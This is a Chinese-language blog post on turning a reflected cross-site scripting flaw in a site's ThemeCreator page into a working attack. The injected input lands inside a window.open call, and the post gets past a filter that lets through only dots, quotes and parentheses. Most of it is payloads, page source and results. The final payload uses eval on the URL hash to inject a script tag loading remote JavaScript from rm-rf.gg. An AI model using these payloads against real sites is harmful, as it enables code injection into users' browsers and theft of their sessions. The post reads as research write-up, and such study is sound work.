---
layout: post
title: 原本丢掉的跨站漏洞 - JavaScript 特性利用
---
#### I.1

今天睡醒后我想到之前的“漏洞”好像可以利用特性让它变成真的漏洞，简单说下功能点。我在测试越权操作的过程中发现未登录的情况下访问创建主题的 URL 站点会进行跳转，为了看清源码使用 View-Source ，这里发现可控点为 c 参数。

[view-source:masaike/ThemeCreator/index.aspx?c=QAQ)QAQ(QAQ](view-source:masaike/ThemeCreator/index.aspx?c=QAQ\)QAQ\(QAQ)

    <script type="text/javascript">
    window.open('/login.aspx?burl=http%3a%2f%2fmasaike%2fThemeCreator%2findex.aspx%3fc%3dQAQ)QAQ(QAQ','_top');
    </script>

对特殊字符进行测试（ `> , < | () : ' " \ % ; & 空格 ...` ）后发现仅允许使用 ` . ' () ` 这4个特殊字符，由于我们得知单引号可以使用，所以思考这里直接闭合 `window.open('/url?QAQ')` 参数然后注入恶意代码便完成了这次攻击，但由于 JS 的 解析错误处理顺序如果不闭合前面语句及注释后面语句是无法执行我们注入的恶意代码的。例如：

    window.open('/1231')alert(1)1','_top');
    window.open('/1231');alert(1)1','_top');
    window.open('/1231')alert(1)//1','_top');

#### II.2

在能闭合 window.open(' 但不能 ; 结束语句的情况下，虽然不能使用其他字符，但这里通过利用 JavaScript 的特性也可以做到执行注入的 JS 代码。

> 常量或已声明的变量及函数+(jscode) 经过解释器的优先级会先执行(jscode)随后报错：VM98:2 Uncaught TypeError: xxxx is not a function(…) 

- 1(console.log(1))
- a(console.log(1))
- document(console.log(1))

上面 3 种情况对应运行结果：

![http://ww3.sinaimg.cn/large/c334041bjw1f34d050c83j20my09o0u9.jpg](http://ww3.sinaimg.cn/large/c334041bjw1f34d050c83j20my09o0u9.jpg)

可以看到在触发 `Uncaught TypeError: xxxx is not a function(…) ` 之前我们优先执行了注入的代码，但如果 `xxx is not defined` 优先级会触发报错且不运行注入代码，在这种漏洞环境因素下我们可以利用如上特性来闭合（不结束语句）执行注入的代码，虽然它依旧会报错。

> 上面结论是我得出的，可能会存在误解 xD

e.g:

    ')(confirm(1))('1111

View-Source:

    <script type="text/javascript">window.open('/login.aspx?burl=masaike%2fThemeCreator%2findex.aspx%3fc%3d')(confirm(1))('1111','_top');</script>

Result:

![http://ww2.sinaimg.cn/large/c334041bjw1f34d7d9ymzj20oa0203yq.jpg](http://ww2.sinaimg.cn/large/c334041bjw1f34d7d9ymzj20oa0203yq.jpg)

#### III.3

在运行完毕我们注入的代码后，随后解释器触发了异常，但没有关系代码已经得到了执行 :)

现在开始编写 Payload 以便加载恶意的远程 JS 代码，我想了下准备使用其中一种：

- eval(String.fromCharCode(97,108,101,114,116,40,49,41))
- document.body.appendChild(...
- eval(location.hash.split('#')[1])
- ...

但开始说到逗号，空格等特殊字符均被过滤，我们仅仅使用的【特殊字符】只有：`' () .` ，这里我采用了最后一种，虽然 split()[] 我们无法使用，但是可以使用 `location.hash.substr(1)` 来包含我们注入在 hash 上的恶意代码。

最终 Payload 如下 [Work: Chrome:Version 49.0.2623.112]：

    ')(eval(location.hash.substr(1)))('#a=document;a.write('<body>');a.body.appendChild(a.createElement(/script/.source)).src='http://rm-rf.gg'

    /index.aspx?c=%27)(eval(location.hash.substr(1)))(%271111#a=document;a.write('<body>');a.body.appendChild(a.createElement(/script/.source)).src='http://rm-rf.gg'

![http://ww1.sinaimg.cn/large/c334041bjw1f34diku8uej215o09gwfx.jpg](http://ww1.sinaimg.cn/large/c334041bjw1f34diku8uej215o09gwfx.jpg)
